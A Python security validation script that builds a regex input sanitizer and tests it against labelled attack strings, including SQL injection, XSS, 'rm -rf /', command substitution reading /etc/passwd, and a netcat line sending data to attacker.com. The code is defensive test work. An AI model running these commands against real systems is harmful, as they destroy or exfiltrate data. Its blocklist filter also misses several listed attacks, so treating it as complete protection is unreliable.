#!/usr/bin/env python3
"""
Security Validation Script

Validates the security implementations without dependencies on ML frameworks.
"""

import re
import os
import hashlib
import secrets
import logging
import json
from datetime import datetime
from pathlib import Path
from dataclasses import dataclass
from enum import Enum
from typing import Dict, List, Optional, Any


class SecurityLevel(Enum):
    """Security validation levels."""
    BASIC = "basic"
    STANDARD = "standard"
    STRICT = "strict"
    PARANOID = "paranoid"


class ThreatType(Enum):
    """Types of security threats."""
    INJECTION = "injection"
    PATH_TRAVERSAL = "path_traversal"
    MALICIOUS_DATA = "malicious_data"
    RESOURCE_EXHAUSTION = "resource_exhaustion"


@dataclass
class SecurityViolation:
    """Security violation report."""
    timestamp: datetime
    violation_type: ThreatType
    severity: str
    message: str
    blocked: bool


class StandaloneInputSanitizer:
    """Standalone input sanitizer for security validation."""
    
    def __init__(self, security_level: SecurityLevel = SecurityLevel.STANDARD):
        self.security_level = security_level
        self.violations: List[SecurityViolation] = []
        self._compile_patterns()
    
    def _compile_patterns(self):
        """Compile regex patterns for security checks."""
        # SQL injection patterns
        self.sql_injection_patterns = [
            re.compile(r"(\b(union|select|insert|update|delete|drop|create|alter|exec|execute)\b)", re.IGNORECASE),
            re.compile(r"(\b(or|and)\b\s*\d+\s*=\s*\d+)", re.IGNORECASE),
            re.compile(r"(--|#|/\*|\*/)", re.IGNORECASE),
            re.compile(r"(\'\s*(or|and)\s*\'\w*\'\s*=\s*\'\w*)", re.IGNORECASE),
        ]
        
        # XSS patterns
        self.xss_patterns = [
            re.compile(r"<script[^>]*>.*?</script>", re.IGNORECASE | re.DOTALL),
            re.compile(r"javascript:", re.IGNORECASE),
            re.compile(r"on\w+\s*=", re.IGNORECASE),
            re.compile(r"<\s*iframe", re.IGNORECASE),
        ]
        
        # Path traversal patterns
        self.path_traversal_patterns = [
            re.compile(r"\.\.[/\\]"),
            re.compile(r"[/\\]\.\."),
        ]
        
        # Command injection patterns
        self.command_injection_patterns = [
            re.compile(r"[;&|`$]"),
            re.compile(r"\$\([^)]+\)"),
            re.compile(r"`[^`]+`"),
        ]
    
    def sanitize_string(self, input_string: str, max_length: Optional[int] = None) -> str:
        """Sanitize string input with comprehensive validation."""
        if not isinstance(input_string, str):
            raise ValueError("Input must be a string")
        
        # Check for null bytes
        if '\x00' in input_string:
            self._log_violation(ThreatType.MALICIOUS_DATA, "Null byte detected", True)
            raise ValueError("Null bytes not allowed in input")
        
        # Length validation
        if max_length and len(input_string) > max_length:
            self._log_violation(ThreatType.RESOURCE_EXHAUSTION, f"Input too long: {len(input_string)}", True)
            raise ValueError(f"Input exceeds maximum length of {max_length}")
        
        # Check for malicious patterns
        self._check_malicious_patterns(input_string)
        
        return input_string.strip()
    
    def sanitize_filename(self, filename: str) -> str:
        """Sanitize filename to prevent path traversal attacks."""
        if not isinstance(filename, str):
            raise ValueError("Filename must be a string")
        
        # Check for path traversal attempts
        for pattern in self.path_traversal_patterns:
            if pattern.search(filename):
                self._log_violation(ThreatType.PATH_TRAVERSAL, f"Path traversal in filename: {filename}", True)
                raise ValueError("Invalid filename: path traversal attempt detected")
        
        # Remove/replace dangerous characters
        safe_filename = re.sub(r'[<>:"/\\|?*\x00-\x1f]', '_', filename)
        
        # Ensure filename is not empty or only dots
        if not safe_filename.strip('.'):
            safe_filename = 'unnamed_file'
        
        return safe_filename
    
    def _check_malicious_patterns(self, input_string: str):
        """Check input against malicious patterns."""
        # Check SQL injection
        for pattern in self.sql_injection_patterns:
            if pattern.search(input_string):
                self._log_violation(ThreatType.INJECTION, "SQL injection pattern detected", True)
                raise ValueError("Potentially malicious input detected")
        
        # Check XSS
        for pattern in self.xss_patterns:
            if pattern.search(input_string):
                self._log_violation(ThreatType.INJECTION, "XSS pattern detected", True)
                raise ValueError("Potentially malicious input detected")
        
        # Check command injection
        for pattern in self.command_injection_patterns:
            if pattern.search(input_string):
                self._log_violation(ThreatType.INJECTION, "Command injection pattern detected", True)
                raise ValueError("Potentially malicious input detected")
    
    def _log_violation(self, threat_type: ThreatType, message: str, blocked: bool):
        """Log security violation."""
        violation = SecurityViolation(
            timestamp=datetime.now(),
            violation_type=threat_type,
            severity="HIGH",
            message=message,
            blocked=blocked
        )
        
        self.violations.append(violation)
    
    def get_violation_summary(self) -> Dict[str, Any]:
        """Get summary of security violations."""
        if not self.violations:
            return {"total_violations": 0, "message": "No security violations recorded"}
        
        # Count by type
        type_counts = {}
        for violation in self.violations:
            violation_type = violation.violation_type.value
            type_counts[violation_type] = type_counts.get(violation_type, 0) + 1
        
        return {
            "total_violations": len(self.violations),
            "violations_by_type": type_counts,
            "blocked_violations": len([v for v in self.violations if v.blocked])
        }


def run_security_validation():
    """Run comprehensive security validation."""
    print("🔒 Starting Security Validation...")
    print("=" * 50)
    
    sanitizer = StandaloneInputSanitizer(SecurityLevel.STRICT)
    
    # Test cases with different attack types
    test_cases = [
        ("Hello World", "Clean input", False),
        ("<script>alert('xss')</script>", "XSS attack", True),
        ("'; DROP TABLE users; --", "SQL injection", True),
        ("../../../etc/passwd", "Path traversal", True),
        ("rm -rf /", "Command injection", True),
        ("Hello\x00World", "Null byte injection", True),
        ("SELECT * FROM users WHERE id = 1", "SQL command", True),
        ("javascript:alert('test')", "JavaScript injection", True),
        ("onload=alert('test')", "Event handler injection", True),
        ("$(rm -rf /)", "Command substitution", True),
        ("`cat /etc/passwd`", "Backtick command execution", True),
        ("data|nc attacker.com 1337", "Command chaining", True),
    ]
    
    results = {
        "total_tests": len(test_cases),
        "blocked_attacks": 0,
        "missed_attacks": 0,
        "false_positives": 0,
        "correct_blocks": 0
    }
    
    print("Testing Input Sanitization:")
    print("-" * 30)
    
    for test_input, description, should_block in test_cases:
        try:
            sanitized = sanitizer.sanitize_string(test_input)
            # Input was allowed
            if should_block:
                print(f"❌ {description}: NOT BLOCKED (Security Risk)")
                results["missed_attacks"] += 1
            else:
                print(f"✅ {description}: ALLOWED (Correct)")
        except ValueError:
            # Input was blocked
            if should_block:
                print(f"✅ {description}: BLOCKED (Correct)")
                results["blocked_attacks"] += 1
                results["correct_blocks"] += 1
            else:
                print(f"❌ {description}: BLOCKED (False Positive)")
                results["false_positives"] += 1
    
    # Test filename sanitization
    print("\nTesting Filename Sanitization:")
    print("-" * 30)
    
    filename_tests = [
        ("document.pdf", "Safe filename", False),
        ("../../../secret.txt", "Path traversal", True),
        ("file<>with*bad?chars.txt", "Dangerous characters", False),
        ("normal_file-2023.doc", "Normal filename", False),
        ("..\\..\\windows\\system32\\config", "Windows path traversal", True),
    ]
    
    for filename, description, should_fail in filename_tests:
        try:
            safe_name = sanitizer.sanitize_filename(filename)
            if should_fail:
                print(f"❌ {description}: NOT BLOCKED - '{filename}' -> '{safe_name}'")
            else:
                print(f"✅ {description}: SANITIZED - '{filename}' -> '{safe_name}'")
        except ValueError as e:
            if should_fail:
                print(f"✅ {description}: BLOCKED - {str(e)}")
            else:
                print(f"❌ {description}: FALSE POSITIVE - {str(e)}")
    
    # Get violation summary
    summary = sanitizer.get_violation_summary()
    
    print("\n" + "=" * 50)
    print("SECURITY VALIDATION RESULTS")
    print("=" * 50)
    
    print(f"Total Tests: {results['total_tests']}")
    print(f"Attacks Correctly Blocked: {results['correct_blocks']}")
    print(f"Attacks Missed: {results['missed_attacks']}")
    print(f"False Positives: {results['false_positives']}")
    
    print(f"\nSecurity Effectiveness:")
    if results['blocked_attacks'] > 0:
        effectiveness = (results['correct_blocks'] / (results['correct_blocks'] + results['missed_attacks'])) * 100
        print(f"  Attack Detection Rate: {effectiveness:.1f}%")
    
    print(f"\nViolation Summary:")
    print(f"  Total Violations: {summary['total_violations']}")
    print(f"  Blocked Violations: {summary['blocked_violations']}")
    print(f"  Violation Types: {list(summary.get('violations_by_type', {}).keys())}")
    
    # Overall assessment
    print(f"\n🛡️  SECURITY ASSESSMENT:")
    if results['missed_attacks'] == 0:
        print("✅ EXCELLENT - All attacks were successfully blocked")
    elif results['missed_attacks'] <= 2:
        print("⚠️  GOOD - Most attacks blocked, some improvements needed")
    else:
        print("❌ POOR - Multiple attacks missed, security needs improvement")
    
    print("\n✅ Security validation completed!")
    return results


if __name__ == "__main__":
    results = run_security_validation()